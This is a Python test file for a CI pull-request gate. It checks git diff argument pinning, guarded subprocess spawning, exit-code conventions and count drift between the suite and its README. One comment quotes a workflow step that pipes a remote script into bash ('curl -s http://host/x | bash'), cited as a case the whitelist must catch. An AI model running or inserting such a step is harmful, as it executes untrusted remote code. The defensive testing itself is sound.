DIFF_ARGV = '["diff", "--no-renames", "-z", "--name-only", f"{base}...HEAD"]'
# `re.sub`, not `.replace("  ", " ")`: that was one non-overlapping pass, so a 16-space continuation
# indent collapsed to 8 and still did not match. It happened to pass only because the argv is on one
# line today — the normalisation was inert, and wrapping the list across two lines (same argv, no
# pathspec, no behaviour change) failed the rule. A guard that fires on a reflow is a guard someone
# deletes.
squashed = re.sub(r"\s+", " ", source)
check("the diff that drives selection takes no pathspec, so no tree can be excluded from it",
      re.sub(r"\s+", " ", DIFF_ARGV) in squashed,
      f"changed_files() must call git with exactly {DIFF_ARGV}")
# The text pin above is a *substring* match, and that is exactly as strong as it sounds: the pinned
# list can stay verbatim while a second list is concatenated onto it —
#
#     git(["diff", "--no-renames", "-z", "--name-only", f"{base}...HEAD"]
#         + ["--", ":(exclude).github"], …)
#
# — which passed 503/503 and stopped every workflow edit from selecting anything. The comment two
# paragraphs up names precisely this threat ("the danger is an *added* argument"), and the text pin
# cannot see it, because nothing was removed. Read structurally instead: the argument git receives must
# be one list literal, so there is nowhere for a second one to be joined on.
diff_call = next((node for node in ast.walk(ast.parse(source))
                  if isinstance(node, ast.Call) and getattr(node.func, "id", None) == "git"
                  and node.args and "...HEAD" in ast.dump(node.args[0])), None)
check("and that argv is a single list literal, not an expression, so no pathspec can be concatenated "
      "onto the pinned text while leaving it intact",
      diff_call is not None and isinstance(diff_call.args[0], ast.List),
      ast.dump(diff_call.args[0])[:200] if diff_call else "no git() call on the diff found")

# Every git invocation goes through git(), which dies on a non-zero exit *and* on a spawn
# failure. Adding those guards call site by call site is what failed twice: run() gained an
# OSError guard while this path kept only FileNotFoundError, so a git on PATH that cannot be
# executed still escaped as a traceback (exit 1) — and the drift check's status call had no
# spawn guard at all. The rule is enforced structurally instead: a raw subprocess.run may live
# only in the three functions that own a guard.
SPAWNERS = {"git", "run", "have_module"}


def raw_spawns_in(text):
    found = []
    for node in ast.walk(ast.parse(text)):
        if (isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
                and node.name not in SPAWNERS):
            for inner in ast.walk(node):
                if (isinstance(inner, ast.Call) and isinstance(inner.func, ast.Attribute)
                        and inner.func.attr == "run"
                        and isinstance(inner.func.value, ast.Name)
                        and inner.func.value.id == "subprocess"):
                    found.append(f"{node.name}:{inner.lineno}")
    return found


check("no function spawns a subprocess outside the three that guard it",
      not raw_spawns_in(source), "; ".join(raw_spawns_in(source)))
# Positive control, per the lesson from the round that shipped a rule which survived its own
# blinding: on a clean file this rule returns the same empty answer whether it works or not.
check("that rule can actually detect a raw spawn",
      raw_spawns_in("def elsewhere():\n    subprocess.run(['git', 'status'])\n") != [])
check("git() dies on a non-zero exit rather than returning empty stdout as an answer",
      re.search(r'def git\(.*?if out\.returncode != 0:\s*\n\s*die\(', source, re.S) is not None)

# Behavioural, per spawn failure that is not FileNotFoundError: a git present on PATH but not
# executable raises PermissionError, also an OSError, and used to escape as a traceback.
for label, thunk in (("changed_files", lambda: pr_gate.changed_files("origin/264")),
                     ("the drift check", pr_gate.run_cci_reference_drift)):
    prior_spawn, prior_run = subprocess.run, pr_gate.run
    try:
        subprocess.run = lambda *a, **k: (_ for _ in ()).throw(PermissionError(13, "denied"))
        pr_gate.run = lambda cmd: (0, "", 0.0)
        try:
            thunk()
            perm_code = 0
        except SystemExit as exc:
            perm_code = exc.code
    finally:
        subprocess.run, pr_gate.run = prior_spawn, prior_run
    check(f"a git that cannot be executed is a tool error in {label}, not a traceback",
          perm_code == 2, perm_code)

# ...and the exit code, not only the shape of the branch. Returning 1 here presented an
# unusable git as a failed check — an infrastructure problem wearing a code verdict — while the
# two calls in changed_files() already died. The generator is stubbed out because with a broken
# root it fails first and the status branch is never reached.
no_repo = tempfile.mkdtemp()
prior_root, prior_run = pr_gate.REPO_ROOT, pr_gate.run
try:
    pr_gate.REPO_ROOT = no_repo
    pr_gate.run = lambda cmd: (0, "", 0.0)
    try:
        with outside_any_repo(no_repo):
            pr_gate.run_cci_reference_drift()
        drift_code = 0
    except SystemExit as exc:
        drift_code = exc.code
finally:
    pr_gate.REPO_ROOT, pr_gate.run = prior_root, prior_run
    os.rmdir(no_repo)
check("an unusable git makes the drift check a tool error (exit 2), not a failed check",
      drift_code == 2, drift_code)

# The same class one layer down: a command that cannot be spawned at all raised OSError out of
# run(), escaped main() as a traceback, and left the interpreter exiting 1 — a tool error read
# as a gating failure, the very confusion the 0/1/2 contract exists to prevent.
try:
    pr_gate.run(["a_binary_that_does_not_exist_anywhere", "x"])
    spawn_code = 0
except SystemExit as exc:
    spawn_code = exc.code
check("an unspawnable command is a tool error (exit 2), not a traceback",
      spawn_code == 2, spawn_code)
check("a timeout stays a check failure, since a hanging check is the change's own doing",
      re.search(r'except subprocess\.TimeoutExpired:.*?return 1,', source, re.S) is not None)

# And the same class one layer *up*, which is where it was actually still open. `run()` normalises a
# signal-killed child to 2 and its comment calls that "the definition of a tool error in this file's
# 0/1/2 contract" — but the booking loop sent 1 and 2 down one branch, so an OOM-killed suite was
# appended to `failures` and the job exited 1: a code verdict on a check that never reached one, in the
# script whose module docstring promises "a tool error is never read as a verdict". Two source-level
# rules above assert the normalisation and the timeout choice, and neither could see this, because the
# defect was in the consumer rather than the producer. Asserted through `main()`'s return value for that
# reason — the same lesson as the name-keyed exemption two waves back.
for runner_code, want, label in ((2, 2, "a signal-killed check is a tool error, not a failure"),
                                 (1, 1, "a real failure is still exit 1"),
                                 (0, 0, "and a clean run is still exit 0")):
    rc, printed = gate_verdict_all(runner_code)
    check(f"{label} — main() exits {want}", rc == want, f"exit {rc}: {printed.strip()[-160:]}")
check("a tool error is named in its own sentence rather than folded into FAILED, so a reader cannot "
      "mistake it for a verdict",
      "NO VERDICT" in gate_verdict_all(2)[1] and "FAILED:" not in gate_verdict_all(2)[1])
# An advisory check is the deliberate exception: it exists so nothing it reports can block a merge, so
# its broken environment must not become the one exit code that does. Still printed and still named.
# No live check is advisory any more (pack 110 retired the one that was), so this exercises the
# mechanism itself with a synthetic check rather than through a real `CHECKS` entry.
synthetic_advisory_check = dict(pr_gate.CHECKS[0], name="synthetic_advisory_probe", gating=False)
advisory_only = gate_verdict_all(2, checks=[synthetic_advisory_check])
check("an advisory check that cannot run does not turn into a blocking tool error",
      advisory_only[0] == 0, advisory_only[0])
check("but it is still reported rather than passing silently",
      "ADVISORY-ERROR" in advisory_only[1])

broken_git = tempfile.mkdtemp()
try:
    # An unreadable repo: `git status` cannot succeed, so the gate must be a tool error
    # (exit 2) rather than a verdict computed from an empty result.
    prior_root = pr_gate.REPO_ROOT
    pr_gate.REPO_ROOT = broken_git
    try:
        with outside_any_repo(broken_git):
            code, out = main_with(["--base", "origin/264"])
        check("an unusable repo is a tool error, not a clean selection",
              code == 2, f"exit {code}: {out[-200:]}")
    finally:
        pr_gate.REPO_ROOT = prior_root
finally:
    os.rmdir(broken_git)

code, out = run_gate("--changed-files-from", os.devnull)
check("an empty change set is a clean pass, not an error", code == 0, out[-300:])
code, out = run_gate("--changed-files-from", "/no/such/file")
check("an unreadable change list is a tool error (exit 2)", code == 2, code)

print("\n" + "=" * 100)
if FAILED:
    print(f"{len(FAILED)} FAILED: {', '.join(FAILED)}")
    # One unresolved subject cascades. `job_with` returns `(None, {})` when it cannot name exactly one
    # job, and the nineteen rules keyed on that job then each report their own subject — "the gate job
    # carries only keys that cannot stop it running" against `{}` — so the reader chases nineteen
    # symptoms with the cause sitting among them unmarked. Naming it costs three lines and is the
    # difference between a diagnosis and a list.
    if "exactly one job runs the gate" in FAILED:
        print("  cause: the gate job could not be identified, so every rule keyed on it is reporting "
              "an empty job rather than a real finding. Fix that one first — the rest are symptoms.")
# Reported before the early exit, not after it: exiting on `FAILED` first meant a red run never
# printed the count, so an edit that both broke a rule and silenced another showed only the break —
# and the silencing was invisible until someone fixed the break and ran again. Both are findings.
# Pinned so a check that stops running is a failure rather than a smaller number nobody reads.
#
# The two directions are not the same event and used to print the same sentence — "update EXPECTED
# deliberately" — which is an instruction to make the failure go away. That is the wrong advice in
# one direction and, worse, it was the *only* output for a step added to the workflow: a step
# spelled `run: curl -s http://host/x | bash` produced no [FAIL] at all, just a request to bump an
# integer. (It now fails a whitelist too, since `raw_shell_of` reads inline scalars — but the
# message had to stop inviting that response either way.)
# Cited in prose too, and prose does not recount itself: the figure in `scripts/ai/README.md` went
# stale the moment this one moved, and was caught by a reviewer rather than by anything here — the
# fourth wave in a row to correct a hand-maintained figure. Pinned, so raising EXPECTED without
# updating the sentence that quotes it is a failure rather than a reader's problem.
README_COUNT = re.compile(r"Verified by `tests/test_pr_gate\.py` \((\d+) checks")
EXPECTED = 680
_readme_text = pathlib.Path(os.path.join(REPO, "scripts/ai/README.md")).read_text()
cited = README_COUNT.search(_readme_text)
check("the check count quoted in scripts/ai/README.md matches EXPECTED, so the prose cannot drift "
      "from the suite (README_COUNT is the sentence it reads)",
      cited is not None and int(cited.group(1)) == EXPECTED,
      cited.group(1) if cited else "the sentence README_COUNT matches is gone")

# The *matrix* size is a second hand-maintained figure and drifted the same way: adding one check
# left five sentences saying "fourteen"/"14 checks", found by review rather than here. Word form as
# well as digits, because four of the five spell it out. Only sentences about the matrix count —
# `MATRIX_SIZE_PROSE` deliberately anchors on phrases that describe CHECKS, since "fourteen" also
# appears in unrelated incident narration that must not be rewritten.
_NUM_WORDS = {13: "thirteen", 14: "fourteen", 15: "fifteen", 16: "sixteen", 17: "seventeen",
              18: "eighteen", 19: "nineteen", 20: "twenty"}
_actual = len(pr_gate.CHECKS)
_stale = [w for n, w in _NUM_WORDS.items() if n != _actual
          for pat in (f"of {w} validators", f"two of the {w}", f"all {w} ran",
                      f"each of the {w} trigger lists", f"run is {n} checks")
          if pat in _readme_text]
check(f"no sentence in scripts/ai/README.md describes the CHECKS matrix with a size other than "
      f"{_actual} ({_NUM_WORDS.get(_actual, _actual)})",
      not _stale, _stale)
REACHED = PASSED + len(FAILED)
if REACHED < EXPECTED:
    print(f"only {REACHED} of {EXPECTED} checks reached a verdict — a rule stopped running, which is "
          "the failure this count exists to catch. Diff the [PASS]/[FAIL] labels against a known-good "
          "run to find which; lowering this number is how a silenced rule ships.")
    sys.exit(1)
if REACHED > EXPECTED:
    print(f"{REACHED} checks ran and {EXPECTED} were expected — if you added checks, raise EXPECTED "
          "at the bottom of this file.")
    sys.exit(1)
if FAILED:
    sys.exit(1)
print(f"{PASSED}/{EXPECTED} checks passed")
